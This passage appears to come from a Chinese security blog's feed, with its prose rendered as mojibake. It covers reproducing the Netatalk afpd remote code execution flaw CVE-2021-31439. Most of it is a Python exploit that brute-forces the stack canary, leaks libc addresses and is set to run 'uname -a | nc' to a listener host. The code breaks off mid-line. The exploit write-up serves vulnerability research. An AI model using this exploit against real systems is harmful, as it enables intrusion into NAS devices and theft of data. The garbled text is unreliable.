<p>è§‚å¯Ÿæ¼æ´å‡½æ•°å˜é‡å®šä¹‰ï¼Œåœ¨æ ˆæ•°ç»„ groupIDs ä¸‹æ–¹æœ‰ä¸‰ä¸ªæŒ‡é’ˆ pCurã€pNextã€pNameï¼Œå®ƒä»¬åœ¨ for å¾ªç¯ä¸­èµ·åˆ°å®šä½çš„ä½œç”¨ï¼Œå¦‚æœåœ¨æº¢å‡ºè¿‡ç¨‹ä¸­è¿™äº›æŒ‡é’ˆè¢«éæ³•æ•°æ®è¦†ç›–ï¼Œå‡½æ•°æ²¡æ‰§è¡Œåˆ°è¿”å›å‰å°±ä¼šå´©æºƒã€‚é€šè¿‡è°ƒè¯•åˆ†æå¯ä»¥è·å–å®ƒä»¬åœ¨è¢«è¦†ç›–ä¹‹å‰çš„å€¼ï¼Œåœ¨æº¢å‡ºæ•°æ®ä¸­å¯¹è¿™äº›å€¼è¿›è¡Œæ¢å¤å³å¯ã€‚</p>
<p><strong>2. å‚æ•°é—®é¢˜</strong></p>
<p>ç”±äºæº¢å‡ºæ˜¯ä»¥ int å‹å³æ¯æ¬¡ 4 å­—èŠ‚æ¥è¦†ç›–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å‘½ä»¤ä¹Ÿè¦ç¬¦åˆè¿™ä¸ªæ¡ä»¶ï¼Œæ¯ 4 å­—èŠ‚å–å°ç«¯åºï¼Œåˆ†æ‰¹å†™å…¥ã€‚</p>
<p><strong>è°ƒè¯•</strong></p>
<p>ç³»ç»Ÿä¸­è‡ªå¸¦ gdb ç¨‹åºï¼Œå¯ç›´æ¥åœ¨ shell ä¸­è°ƒè¯•ã€‚</p>
<p>ä½ å¯ä»¥åœ¨ <a class="link"   href="https://gist.github.com/rrrrrrri/b94552a353f81f57ac6e6cc66062fedd" >Github<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸Šè·å–æ¼”ç¤ºè„šæœ¬ã€‚</p>
<h2 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h2><p>è¯·è§‚çœ‹ä¸‹é¢çš„æ¼”ç¤ºè§†é¢‘</p>
<p><video controls height='100%' width='100%' src="/img/array_vxag_05.mp4"></video></p>
<p>æœ¬æ–‡å†…å®¹åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œæˆ‘ä»¬å°†åœ¨ä¸‹ç¯‡æ–‡ç« ä¸­ä»‹ç» License å’Œ VPN çš„ç›¸å…³é—®é¢˜ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-31439</title>
    <url>/2022/04/02/CVE-2021-31439/</url>
    <content><![CDATA[<p>2021 å¹´ 5 æœˆ 24 æ—¥ï¼ŒZDI å‘å¸ƒäº†å…³äºå½±å“ç¾¤æ™–æŸäº›å‹å·è®¾å¤‡çš„ RCE æ¼æ´ CVE-2021-31439ï¼Œ2022 å¹´ 3 æœˆ 28 æ—¥ï¼ŒDEVCORE å‘å¸ƒäº†å¯¹äºæ­¤æ¼æ´çš„åˆ†ææ–‡ç« ï¼Œæ–‡ä¸­åªä»‹ç»äº†æ­¤æ¼æ´çš„æˆå› å’Œåˆ©ç”¨æ€è·¯ï¼Œåœ¨å®é™…å¤ç°è¿‡ç¨‹ä¸­è¿˜å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæœ¬æ–‡å¯¹ä¸€äº›é—®é¢˜è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><p>å—å½±å“çš„ç»„ä»¶æ˜¯å¼€æºé¡¹ç›® Netatalkï¼Œè¯¥é¡¹ç›®å®ç°äº†è‹¹æœå…¬å¸æå‡ºçš„ AFP æ–‡ä»¶ä¼ è¾“åè®®ï¼Œå¹¶åº”ç”¨åœ¨å¾ˆå¤š NAS è®¾å¤‡ä¸Šï¼Œç”±äºæš‚æ—¶æ²¡æœ‰ç›®æ ‡è®¾å¤‡ï¼Œæˆ‘åœ¨ ubuntu 16.04 è™šæ‹Ÿæœºä¸Šç¼–è¯‘å®‰è£…äº† Netatalk 3.1.12 æ¨¡æ‹Ÿè®¾å¤‡ç¯å¢ƒã€‚</p>
<p>Netatalk é¡¹ç›®å®˜ç½‘ï¼š<a class="link"   href="https://netatalk.sourceforge.io/" >https://netatalk.sourceforge.io/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ³¨ï¼šå¦‚æœä½¿ç”¨ apt å®‰è£…ï¼Œå¾—åˆ°çš„ afpd ç¨‹åºä¸€èˆ¬æ˜¯å¼€å¯äº†æ‰€æœ‰ä¿æŠ¤æªæ–½ï¼Œä¸æ–¹ä¾¿è¿›è¡Œå¤ç°ã€‚</p>
<h1 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h1><p>è¯¦ç»†çš„æ¼æ´åˆ†ææ–‡ç« å¯åœ¨<a class="link"   href="https://devco.re/blog/2022/03/28/your-NAS-is-not-your-NAS/" >DEVCORE æŠ€æœ¯åšå®¢<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>æ‰¾åˆ°ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œæˆ‘ä»¬è¦è§£å†³ä¸€äº›åšå®¢ä¸­æ²¡æåˆ°çš„é—®é¢˜ã€‚</p>
<h2 id="åè®®å®ç°"><a href="#åè®®å®ç°" class="headerlink" title="åè®®å®ç°"></a>åè®®å®ç°</h2><p>å­˜åœ¨æ¼æ´çš„ç¨‹åºå®ç°äº† AFP æ–‡ä»¶ä¼ è¾“åè®®ï¼Œåè®®ç”±è‹¹æœå…¬å¸æå‡ºï¼Œå®ƒå’Œ SMB ç±»ä¼¼ï¼Œä¸è¿‡åœ¨åç»­çš„å‘å±•è¿‡ç¨‹ä¸­é€æ¸è¢«æŠ›å¼ƒäº†ã€‚</p>
<p>ä¸ºäº†åˆ©ç”¨æ­¤æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦å®ç°åŸºæœ¬çš„ DSI å’Œ AFP åè®®ï¼Œä»¥ä¾¿äºå’ŒæœåŠ¡å™¨äº¤äº’ã€‚ç½‘ç»œä¸Šæœ‰ä¸€äº› C è¯­è¨€å®ç°çš„ AFP å®¢æˆ·ç«¯ï¼Œä¸è¿‡éš¾ä»¥ä»å…¶ä¸­å‰¥ç¦»å‡ºæœ‰ç”¨çš„ä»£ç ï¼Œæˆ‘å‚è€ƒäº† metasploit ä¸­ AFP ä¿¡æ¯æ‰«æä»¥åŠå¯†ç ç ´è§£æ¨¡å—çš„å®ç°ï¼Œåœ¨ python ä¸­ç®€å•å®ç°äº†ç›¸å…³åè®®ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š<a class="link"   href="https://github.com/rapid7/metasploit-framework/pull/216/files" >https://github.com/rapid7/metasploit-framework/pull/216/files<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/afp/afp_login.rb" >https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/afp/afp_login.rb<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="è§¦å‘å‰æ"><a href="#è§¦å‘å‰æ" class="headerlink" title="è§¦å‘å‰æ"></a>è§¦å‘å‰æ</h2><p>åœ¨æ–‡ç« ä¸­æåˆ°æ¼æ´æ˜¯ç¨‹åºè°ƒç”¨ <code>dsi_stream_receive</code> å‡½æ•°è¯»å– DSI æ•°æ®æ—¶å‡ºç°é—®é¢˜ï¼Œå¯¹åº” DSI ä¸­ command &#x3D; 2 æƒ…å†µï¼Œéœ€è¦æ³¨æ„ç›´æ¥å‘é€ç›¸å…³æ•°æ®å¹¶ä¸èƒ½æ¥åˆ°æ¼æ´ç‚¹ï¼Œé¦–å…ˆéœ€è¦æ„é€  <code>DSI_OpenSession</code> åŒ…åˆ›å»ºä¸€ä¸ª Sessionã€‚</p>
<h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>æ–‡ç« æŒ‡å‡ºåˆ©ç”¨æ€è·¯ä¸ºè¦†ç›– <code>_tls_dtor_list</code> æŒ‡é’ˆï¼Œå½“ç¨‹åºè°ƒç”¨ exit æ—¶ä¼šæ¥åˆ° <code>__call_tls_dtors</code> å‡½æ•°ï¼Œåœ¨å¯æ§å†…å­˜ä¸­æ„é€ å¥½å„ä¸ªç»“æ„ä½“å³å¯åŠ«æŒæ§åˆ¶æµè¿›è€Œå®ç° RCEã€‚</p>
<p>åœ¨å®é™…è°ƒè¯•è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ï¼Œå¦‚åœ¨æ³„éœ²å‡º canary ä¹‹åè¿˜è¦ç»§ç»­æ³„éœ²åˆ° libc åœ°å€ï¼Œå¦åˆ™è¦†ç›– TLS ç»“æ„æ—¶ä¼šç”±äºæŸäº›æŒ‡é’ˆå¼‚å¸¸å¯¼è‡´ç¨‹åºå´©æºƒã€‚</p>
<p>æ³„éœ² libc åœ°å€æ—¶åœ¨æŸäº›ç‰¹æ®Šçš„å†…å­˜å¸ƒå±€æƒ…å†µä¸‹ä¼šå¯¼è‡´æ³„éœ²å‡ºæ¥çš„åœ°å€æœ‰ä¸€äº›åç§»ï¼Œéœ€è¦ç¼–å†™ä»£ç è¿‡æ»¤è¿™äº›æƒ…å†µã€‚</p>
<p>æ¸…ç©º <code>pointer_guard</code> åå†è°ƒç”¨æŸäº›åŠŸèƒ½ä¼šç”±äºæŒ‡é’ˆè§£å¯†å¤±è´¥å¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä»”ç»†ç¼–æ’å¸ƒç½® payload çš„é¡ºåºï¼Œç»è¿‡æµ‹è¯•å‘ç°éœ€è¦å…ˆå¸ƒç½® bss ç»“æ„ï¼Œç„¶åå†å¸ƒç½® TLS ç»“æ„ã€‚</p>
<p>å¦å¤–ä¹Ÿæ˜¯æœ€é‡è¦çš„ä¸€ç‚¹ï¼Œæ–‡ç« ä¸­å†™åˆ°åŠ«æŒæ§åˆ¶æµåå¯ä»¥é€šè¿‡è°ƒç”¨ execl æ¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼Œä½† execl éœ€è¦æ§åˆ¶å¥½å„ä¸ªå‚æ•°ã€‚è¿™é‡Œç”¨åˆ°çš„æ€è·¯æ˜¯ CTF ä¸­çš„ SROPï¼Œå…ˆåŠ«æŒæ§åˆ¶æµåˆ° setcontext å‡½æ•°ï¼Œè°ƒæ•´å¥½å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œå†è·³è½¬åˆ° <code>IO_proc_open</code> å‡½æ•°ä¸­è°ƒç”¨ execl å‡½æ•°çš„ä½ç½®ã€‚</p>
<p>è°ƒè¯•å¥½å„ä¸ªå˜é‡çš„åç§»ä¹‹åå¯ä»¥å†™å‡ºèƒ½å¤Ÿæ‰§è¡Œä»»æ„å‘½ä»¤çš„ pocï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2021-31439-1.png"
                     
                ></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">R_HOST = <span class="string">&quot;192.168.152.133&quot;</span></span><br><span class="line">R_PORT = <span class="number">548</span></span><br><span class="line"></span><br><span class="line">SUPPORT_VERSION = [<span class="string">&quot;Netatalk3.1.12&quot;</span>]</span><br><span class="line"></span><br><span class="line">DSI_CloseSession     = <span class="number">0x01</span></span><br><span class="line">DSI_Common           = <span class="number">0x02</span></span><br><span class="line">DSI_FPGetSrvrInfo    = <span class="number">0x03</span></span><br><span class="line">DSI_OpenSession      = <span class="number">0x04</span></span><br><span class="line"></span><br><span class="line">MAX_RECV_LENGTH = <span class="number">4096</span></span><br><span class="line">DSI_SERVQUANT_DEF = <span class="number">0x100000</span></span><br><span class="line"></span><br><span class="line">nl_global_locale_padding_offset = <span class="number">0x102678</span></span><br><span class="line">dtor_list_padding_offset = <span class="number">0x1026b0</span></span><br><span class="line">tls_padding_length = <span class="number">0x1026f0</span>    <span class="comment"># padding to TLS</span></span><br><span class="line">nl_global_locale_offset = <span class="number">0x3c5420</span></span><br><span class="line">username_address = <span class="number">0x656190</span></span><br><span class="line">username = (<span class="string">&quot;iot&quot;</span>.ljust(<span class="number">16</span>, <span class="string">&quot;\x00&quot;</span>)).encode()</span><br><span class="line">command = <span class="string">b&quot;`uname -a | nc 192.168.152.129 31337`&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DSI</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, dsi_flags, dsi_command, dsi_requestID, dsi_dataOffset, dsi_len, dsi_reserved</span>):</span><br><span class="line">        self.dsi_flags = dsi_flags</span><br><span class="line">        self.dsi_command = dsi_command</span><br><span class="line">        self.dsi_requestID = dsi_requestID</span><br><span class="line">        self.dsi_dataOffset = dsi_dataOffset</span><br><span class="line">        self.dsi_len = dsi_len</span><br><span class="line">        self.dsi_reserved = dsi_reserved</span><br><span class="line"></span><br><span class="line">        self.header_length = <span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gen_packet</span>(<span class="params">self, data=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">        packet = <span class="string">b&quot;&quot;</span></span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!B&quot;</span>, self.dsi_flags)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!B&quot;</span>, self.dsi_command)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!H&quot;</span>, self.dsi_requestID)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_dataOffset)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_len)</span><br><span class="line">        packet += struct.pack(<span class="string">&quot;!I&quot;</span>, self.dsi_reserved)</span><br><span class="line">        packet += data</span><br><span class="line">        <span class="keyword">return</span> packet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_body_error_code</span>(<span class="params">packet</span>):</span><br><span class="line">    flags = packet[<span class="number">0</span>]</span><br><span class="line">    command = packet[<span class="number">1</span>]</span><br><span class="line">    request_id = packet[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    error_code = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, packet[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    length = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, packet[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]</span><br><span class="line">    reserved = packet[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">    body = packet[<span class="number">16</span>:length + <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">if</span> length != <span class="built_in">len</span>(body):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Invalid packet length&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (error_code, body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_parse_srvInfo</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># https://github.com/rapid7/metasploit-framework/pull/216/files</span></span><br><span class="line">    error_code,body = _get_body_error_code(data)</span><br><span class="line"></span><br><span class="line">    machine_type_offset = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, body[<span class="number">0</span>:<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line">    version_count_offset = body[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    uam_count_offset = body[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">    icon_offset = body[<span class="number">6</span>:<span class="number">8</span>]</span><br><span class="line">    flags = body[<span class="number">8</span>:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">    server_name_length = body[<span class="number">10</span>]</span><br><span class="line">    server_name = body[<span class="number">11</span>:server_name_length + <span class="number">11</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got server name: %s&quot;</span> % server_name.decode())</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">10</span> + server_name_length + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> pos % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        pos += <span class="number">1</span>    <span class="comment"># padding</span></span><br><span class="line"></span><br><span class="line">    server_signature_offset = body[pos:pos + <span class="number">2</span>]</span><br><span class="line">    network_addresses_count_offset = body[pos + <span class="number">2</span>:pos + <span class="number">4</span>]</span><br><span class="line">    directory_names_count_offset = body[pos + <span class="number">4</span>:pos + <span class="number">6</span>]</span><br><span class="line">    utf8_server_name_offset = body[pos + <span class="number">6</span>:pos + <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    machine_type_length = body[machine_type_offset]</span><br><span class="line">    machine_type = body[pos + <span class="number">9</span>:pos + machine_type_length + <span class="number">9</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got machine type: %s&quot;</span> % machine_type.decode())</span><br><span class="line">    <span class="keyword">if</span> machine_type.decode() <span class="keyword">not</span> <span class="keyword">in</span> SUPPORT_VERSION:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Target not support.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># continue parse seems not necessary</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_parse_openSession</span>(<span class="params">data</span>):</span><br><span class="line">    error_code,body = _get_body_error_code(data)</span><br><span class="line">    <span class="keyword">if</span> error_code[<span class="number">0</span>] != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] OpenSession failed.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print(&quot;[+] OpenSession success&quot;)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_open_session</span>():</span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">         s.connect((R_HOST, R_PORT))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error connecting server&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print(&quot;[*] OpenSession&quot;)</span></span><br><span class="line">    _open_session_packet = DSI(<span class="number">0x0</span>, DSI_OpenSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_open_session_packet)</span><br><span class="line">    simple_parse_openSession(s.recv(MAX_RECV_LENGTH))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak_one</span>(<span class="params">sock, canary</span>):</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * tls_padding_length + <span class="string">b&quot;tcb__ptr&quot;</span> + <span class="string">b&quot;dtv__ptr&quot;</span> + <span class="string">b&quot;self_ptr&quot;</span> + <span class="string">b&quot;mult&quot;</span> + <span class="string">b&quot;scop&quot;</span> + <span class="string">b&quot;_sysinfo&quot;</span></span><br><span class="line">    payload += canary</span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    sock.send(_packet)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    data = sock.recv(MAX_RECV_LENGTH)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak</span>(<span class="params">n, canary</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] ==== Byte%d ====&quot;</span> % n)</span><br><span class="line">    _succ = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">        <span class="comment"># print(&quot;[*]     Trying &quot; + str(i))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock = connect_open_session()</span><br><span class="line">            _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, ((i &lt;&lt; (n * <span class="number">8</span>)) | canary))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> _leak_one(sock, _tmp):</span><br><span class="line">                canary = ((i &lt;&lt; <span class="number">8</span>) | canary)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sock.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got byte%d: %d&quot;</span> % (n, i))</span><br><span class="line">    <span class="comment"># if i == 0:</span></span><br><span class="line">    <span class="comment">#     print(&quot;[-] Error leaking canary. Try again&quot;)</span></span><br><span class="line">    <span class="comment">#     exit(0)</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_canary</span>():</span><br><span class="line">    canary = <span class="number">0x0</span>    <span class="comment"># canary lowest byte == 0x00</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Leaking canary (stable)...&quot;</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">1</span>, canary) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">2</span>, canary) &lt;&lt; <span class="number">16</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">3</span>, canary) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">4</span>, canary) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">5</span>, canary) &lt;&lt; <span class="number">40</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">6</span>, canary) &lt;&lt; <span class="number">48</span>)</span><br><span class="line">    canary |= (_leak(<span class="number">7</span>, canary) &lt;&lt; <span class="number">56</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak_one2</span>(<span class="params">sock, value</span>):</span><br><span class="line">    payload = <span class="string">b&quot;\x00&quot;</span> * nl_global_locale_padding_offset</span><br><span class="line">    payload += value</span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _crash_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    sock.sendall(_crash_packet)</span><br><span class="line"></span><br><span class="line">    _close_packet = DSI(<span class="number">0x0</span>, DSI_CloseSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    sock.sendall(_close_packet)</span><br><span class="line">    sock.recv(MAX_RECV_LENGTH)</span><br><span class="line">    sock.send(<span class="string">b&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">    sock.recv(MAX_RECV_LENGTH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_leak2</span>(<span class="params">n, global_locale, _step=<span class="number">1</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] ==== Byte%d ====&quot;</span> % n)</span><br><span class="line">    vals = []</span><br><span class="line">    _succ = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x100</span>, _step):</span><br><span class="line">        <span class="comment"># print(&quot;[*]     Trying &quot; + str(i))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock = connect_open_session()</span><br><span class="line">            _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (((i) &lt;&lt; (n * <span class="number">8</span>)) | global_locale))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> _step == <span class="number">0x10</span>:</span><br><span class="line">                _tmp = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (((i + <span class="number">4</span>) &lt;&lt; (n * <span class="number">8</span>)) | global_locale))[:n + <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># print(_tmp)</span></span><br><span class="line">            _leak_one2(sock, _tmp)</span><br><span class="line">            <span class="keyword">if</span> _step == <span class="number">0x10</span>:</span><br><span class="line">                vals.append(i + <span class="number">4</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                vals.append(i)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">return</span> vals</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    global_locale = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Leaking libc (unstable)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    byte0 = [<span class="number">0x20</span>]</span><br><span class="line">    byte1 = []</span><br><span class="line">    byte2 = []</span><br><span class="line">    byte3 = []</span><br><span class="line">    byte4 = []</span><br><span class="line">    byte5 = [<span class="number">0x7f</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte0&quot;</span> % <span class="built_in">len</span>(byte0))</span><br><span class="line">    <span class="keyword">for</span> m_byte0 <span class="keyword">in</span> byte0:</span><br><span class="line">        global_locale = global_locale | m_byte0</span><br><span class="line">        byte1 = _leak2(<span class="number">1</span>, global_locale, <span class="number">0x10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte1) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte0)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(byte1)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte1) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte1) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Detect %d possible val(s) for byte1&quot;</span> % <span class="built_in">len</span>(byte1))</span><br><span class="line">    <span class="keyword">for</span> m_byte1 <span class="keyword">in</span> byte1:</span><br><span class="line">        global_locale = global_locale | (m_byte1 &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        byte2 = _leak2(<span class="number">2</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte2) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte1)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte2)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte2) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. 